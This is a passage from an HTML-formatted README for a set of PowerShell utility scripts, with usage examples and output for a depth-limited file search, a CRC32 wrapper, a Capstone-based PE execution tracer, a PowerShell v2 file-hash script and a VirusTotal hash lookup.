PS C:\&gt; Get-LimitChildItem -Path &quot;\\192.168.84.129\C$\Program Files\&quot; -MaxDepth 5 -Filter &quot;*.txt&quot;<br/>
\\192.168.84.129\C$\Program Files\Windows Defender\ThirdPartyNotices.txt<br/>
\\192.168.84.129\C$\Program Files\VMware\VMware Tools\open_source_licenses.txt<br/>
\\192.168.84.129\C$\Program Files\VMware\VMware Tools\vmacthlp.txt<br/>
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceAmharic.txt<br/>
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceArray.txt<br/>
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceDaYi.txt<br/>
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceTigrinya.txt<br/>
\\192.168.84.129\C$\Program Files\Windows NT\TableTextService\TableTextServiceYi.txt<br/>
<br/>
# Local wildcard *ini* search<br/>
PS C:\&gt; Get-LimitChildItem -Path C:\ -MaxDepth 3 -Filter &quot;*ini*&quot;<br/>
C:\Windows\system.ini<br/>
C:\Windows\win.ini<br/>
C:\Windows\Boot\BootDebuggerFiles.ini<br/>
C:\Windows\Fonts\desktop.ini<br/>
C:\Windows\INF\mdmminij.inf<br/>
C:\Windows\Media\Windows Minimize.wav<br/>
C:\Windows\PolicyDefinitions\PenTraining.admx<br/>
C:\Windows\PolicyDefinitions\WinInit.admx<br/>
C:\Windows\System32\dwminit.dll<br/>
C:\Windows\System32\ie4uinit.exe<br/>
C:\Windows\System32\ieuinit.inf<br/>
C:\Windows\System32\PerfStringBackup.INI<br/>
C:\Windows\System32\rdpinit.exe<br/>
C:\Windows\System32\regini.exe<br/>
C:\Windows\System32\secinit.exe<br/>
C:\Windows\System32\tcpmon.ini<br/>
C:\Windows\System32\TpmInit.exe<br/>
C:\Windows\System32\userinit.exe<br/>
C:\Windows\System32\userinitext.dll<br/>
C:\Windows\System32\UXInit.dll<br/>
C:\Windows\System32\WimBootCompress.ini<br/>
C:\Windows\System32\wininet.dll<br/>
C:\Windows\System32\wininetlui.dll<br/>
C:\Windows\System32\wininit.exe<br/>
C:\Windows\System32\wininitext.dll<br/>
C:\Windows\System32\winipcfile.dll<br/>
C:\Windows\System32\winipcsecproc.dll<br/>
C:\Windows\System32\winipsec.dll<br/>
C:\Windows\SysWOW64\ieuinit.inf<br/>
C:\Windows\SysWOW64\regini.exe<br/>
C:\Windows\SysWOW64\secinit.exe<br/>
C:\Windows\SysWOW64\TpmInit.exe<br/>
C:\Windows\SysWOW64\userinit.exe<br/>
C:\Windows\SysWOW64\userinitext.dll<br/>
C:\Windows\SysWOW64\UXInit.dll<br/>
C:\Windows\SysWOW64\WimBootCompress.ini<br/>
C:\Windows\SysWOW64\wininet.dll<br/>
C:\Windows\SysWOW64\wininetlui.dll<br/>
C:\Windows\SysWOW64\wininitext.dll<br/>
C:\Windows\SysWOW64\winipcfile.dll<br/>
C:\Windows\SysWOW64\winipcsecproc.dll<br/>
C:\Windows\SysWOW64\winipsec.dll<br/>
Get-CRC32<br/>
A simple wrapper for the undocumented RtlComputeCrc32 function.<br/>
<br/>
# Example from string<br/>
C:\PS&gt; $String = [System.Text.Encoding]::ASCII.GetBytes(&quot;Testing!&quot;)<br/>
C:\PS&gt; Get-CRC32 -Buffer $String<br/>
C:\PS&gt; 2392247274<br/>
Trace-Execution<br/>
Uses the Capstone engine to recursively disassemble a PE (x32/x64) from it's entry point, effectively &quot;following&quot; execution flow. The following rules are observed:<br/>
<br/>
jmp's are taken if they fall in the PE address space<br/>
call's are taken if they fall in the PE address space<br/>
ret's are taken and use the return address stored by call instructions<br/>
indirect call/jmp's are not taken<br/>
conditional jmp's are not taken<br/>
call/jmp's which reference a register are not taken<br/>
There are many many edge cases here which can make disassembly unreliable. As a general rule, the more addresses you disassemble, the less trustworthy the output is. The call table can be used as a reference to gauge the veracity of the output.<br/>
<br/>
Since disassembly is static, working of a byte array, x32/x64 PE's can be disassembled regardless of the bitness of PowerShell.<br/>
<br/>
PS C:\&gt; Trace-Execution -Path .\Desktop\some.exe -InstructionCount 10<br/>
<br/>
[&gt;] 32-bit Image!<br/>
<br/>
[?] Call table:<br/>
<br/>
Address  Mnemonic Taken Reason<br/>
-------  -------- ----- ------<br/>
0x4AD0829A call   Yes  Relative offset call<br/>
0x4AD07CB7 call   No  Indirect call<br/>
<br/>
[?] Instruction trace:<br/>
<br/>
Size Address  Mnemonic Operands          Bytes          RegRead RegWrite<br/>
---- -------  -------- --------          -----          ------- --------<br/>
 5 0x4AD0829A call   0x4ad07c89         {232, 234, 249, 255...} {esp}<br/>
 2 0x4AD07C89 mov   edi, edi          {139, 255, 249, 255...}<br/>
 1 0x4AD07C8B push   ebp             {85, 255, 249, 255...} {esp}  {esp}<br/>
 2 0x4AD07C8C mov   ebp, esp          {139, 236, 249, 255...}<br/>
 3 0x4AD07C8E sub   esp, 0x10          {131, 236, 16, 255...}      {eflags}<br/>
 5 0x4AD07C91 mov   eax, dword ptr [0x4ad240ac] {161, 172, 64, 210...}<br/>
 4 0x4AD07C96 and   dword ptr [ebp - 8], 0   {131, 101, 248, 0...}      {eflags}<br/>
 4 0x4AD07C9A and   dword ptr [ebp - 4], 0   {131, 101, 252, 0...}      {eflags}<br/>
 1 0x4AD07C9E push   ebx             {83, 101, 252, 0...}  {esp}  {esp}<br/>
 1 0x4AD07C9F push   edi             {87, 101, 252, 0...}  {esp}  {esp}<br/>
 5 0x4AD07CA0 mov   edi, 0xbb40e64e       {191, 78, 230, 64...}<br/>
 5 0x4AD07CA5 mov   ebx, 0xffff0000       {187, 0, 0, 255...}<br/>
 2 0x4AD07CAA cmp   eax, edi          {59, 199, 0, 255...}       {eflags}<br/>
 6 0x4AD07CAC jne   0x4ad1bc8c         {15, 133, 218, 63...}  {eflags}<br/>
 1 0x4AD07CB2 push   esi             {86, 133, 218, 63...}  {esp}  {esp}<br/>
 3 0x4AD07CB3 lea   eax, dword ptr [ebp - 8]  {141, 69, 248, 63...}<br/>
 1 0x4AD07CB6 push   eax             {80, 69, 248, 63...}  {esp}  {esp}<br/>
 6 0x4AD07CB7 call   dword ptr [0x4ad01150]   {255, 21, 80, 17...}  {esp}<br/>
 3 0x4AD07CBD mov   esi, dword ptr [ebp - 4]  {139, 117, 252, 0...}<br/>
 3 0x4AD07CC0 xor   esi, dword ptr [ebp - 8]  {51, 117, 248, 0...}       {eflags}<br/>
Calculate-Hash<br/>
PowerShell v2 compatible script to calculate file hashes. I quickly scripted this together because Get-FileHash is only available in v4+.<br/>
<br/>
Get the SHA512 hash of &quot;C:\Some\File.path&quot;.<br/>
C:\PS&gt; Calculate-Hash -Path C:\Some\File.path -Algorithm SHA512<br/>
Check-VTFile<br/>
Submit SHA256 hash of a file to Virus Total and retrieve the scan report if the hash is known. This requires you to get a, free, VirusTotal API key. Again, lot's of better projects out there for this but not PowerShell v2 compatible.<br/>
<br/>
C:\PS&gt; Check-VTFile -Path C:\Some\File.path</body></html>